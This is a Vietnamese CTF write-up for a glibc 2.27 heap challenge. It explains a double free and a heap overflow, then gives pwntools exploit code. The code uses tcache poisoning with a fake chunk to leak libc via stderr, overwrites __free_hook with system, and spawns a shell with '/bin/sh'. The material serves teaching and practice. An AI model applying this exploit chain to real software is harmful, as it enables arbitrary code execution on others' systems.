**1.Find bug**
  - ![image](https://user-images.githubusercontent.com/113702087/220030510-859dae24-8668-41e8-9bde-a9f9eaab5c06.png)
  - PIE và Fortify tắt.
  - ![image](https://user-images.githubusercontent.com/113702087/220022145-4c49d73e-b46c-4791-91fe-aef24fdd12c1.png)
  - chương trình thực hiện nhập name tại 0x602060 và thực thi read data trên heap được cấp phát tại 0x602088, tuy nhiên giới hạn của việc free là 8 lần.
  - Tại hàm info ta có thể in ra name.
  - do libc-2.27 nên ta có thể double free đê gây lỗi uaf.
  - ![image](https://user-images.githubusercontent.com/113702087/220031133-961eedfe-ec72-4ba1-bf49-77ac6223b435.png)
  - ta có thể thấy rằng khi tại hàm Malloc() nó thực hiện read_input(ptr, uint(size - 16)) nếu size < 16 thì có thể read với size lớn gây lỗi heap overflow.
  - Dựa vào các lỗi trên ta có thể leak libc = cách đưa addr libc vào tcache và giải phóng name lúc đó name -> libc, lúc này ta dùng info để leak libc ra. Khi có libc thì có thể overwrite free_hook thành system
  - ta sẽ chọn địa chỉ name+16 là fake chunk và libc là stderr

**2. Exploit**
 ### Leak libc
  - Để đưa libc và fakechunk về cùng 1 chunk thì ta cần control size = 0x90 của chunk, với fakechunk thì khá dễ vì ta có thể control nó bằng cách nhập từ name
  - `r.sendafter(b'Name', b'\x41'*8 + p64(0x91))` tạo size cho fakechunk
  - Tạo 4 chunk và giải phóng nó.
  ```python
  malloc(size_, b'a')
  freeandinfo(b'2')
  freeandinfo(b'2')
  malloc(size_ + 24, b'aaaa')
  freeandinfo(b'2')
  malloc(size_ + 40, b'aaaa')
  freeandinfo(b'2')
  malloc(size_ + 56, b'aaaa')
  freeandinfo(b'2')
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/220078906-f8d92564-7224-4794-896f-5c5904c9fdc3.png)
  - chunk đầu ta sẽ dùng double free, overflow nó để control các chunk dưới, và chứa lbic_stderr+30 để control size libc_stderr
  - chunk 2 ta đưa stderr, cấp phát vào stderr và thay đổi nó thành libc_stderr-0x30 thay đổi stderr ở chunk 1
  - chunk 3 đưa fakechunk vào để có thể free vào chunk mong muốn ( ở đây là chunk chứa libc)
  - chunk 4 cũng là fakechunk để ta có thể control được ptr vì chương trình đã giới hạn việc free.
  - setup các chunk
  ```
  payload = p64(stderr) + b'\x00'*16 + p64(0x31) + p64(stderr) + b'\x00'*32 + p64(0x41) + p64(name_addr + 16) + b'\x00'*48 + p64(0x51) + p64(name_addr + 16)

  malloc(size_, payload)
  malloc(size_ + 24, b'a')
  malloc(size_ + 24, b'\x50')
  malloc(size_, b'a')
  malloc(size_, b'a')
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/220079920-00e4a33c-1fc8-4b36-a435-32a44e3e3f61.png)
  - ![image](https://user-images.githubusercontent.com/113702087/220081175-9c7c37e6-f9d1-4c71-999e-2e3d788289c4.png)
  - thay đổi size libc_stderr và đưa vào tcache_c
  ```
  payload = b'\x00'*40 + p64(0x91)
  malloc(size_, payload)
  malloc(size_ + 24, b'\x87')
  freeandinfo(b'2')
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/220081883-10198633-7bb4-4635-b8cb-092b55a79ee3.png)
  - Sau khi đưa libc_stderr vào tcache ta free(fakechunk) tcache 0x90: `fakechunk->libc_stderr`
  ```
  malloc(size_ + 40, b'a')
malloc(size_ + 40, b'a')
freeandinfo(b'2')
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/220082718-35ee95cc-6b5b-40b2-8d54-055eb2a4ebec.png)
  ```
  freeandinfo(b'3')
r.recvuntil(b'Name :')
r.recv(16)
out = r.recv(8)
libc.address = u64(out) - 0x3ec680
print(hex(libc.address))
  ```
 ### Overwrite free_hook và lấy shell
  ```
  malloc(size_ + 56, b'a')
malloc(size_ + 56, p64(libc.sym['__free_hook']))
malloc(size_ + 120, b'a')
malloc(size_ + 120, p64(libc.sym['system']))

malloc(size_ + 112, b'/bin/sh')
freeandinfo(b'2')
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/220083309-d75596e1-2280-48f3-9445-32870d89c9f7.png)
  - ![image](https://user-images.githubusercontent.com/113702087/220083419-b37a7326-e416-4023-aaca-f1cbb5b3303e.png)

